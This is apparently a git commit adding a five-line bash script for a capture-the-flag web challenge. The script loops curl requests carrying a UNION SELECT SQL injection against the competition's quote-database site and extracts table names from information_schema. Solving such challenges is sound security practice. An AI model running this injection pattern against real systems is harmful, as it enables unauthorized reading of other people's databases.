45558f42e27fa56afc5862049f52bae26cd08fcc
Martin Petkov <mpetkov@google.com>
2021-09-21 18:02:08 -0400

    Add enumerate_tables.sh

---
+++ 14-web-quotedb/enumerate_tables.sh
@@ -0,0 +1,5 @@
+#!/usr/bin/env bash
+
+for i in {1..100}; do
+  curl -s 'https://quotedb-web.2021.ctfcompetition.com/?id=77%20UNION%20SELECT%20TABLE_CATALOG,TABLE_NAME,TABLE_TYPE%20FROM%20information_schema.tables%20LIMIT%20'${i}',1' | grep '    "' | grep -o '".*"'
+done
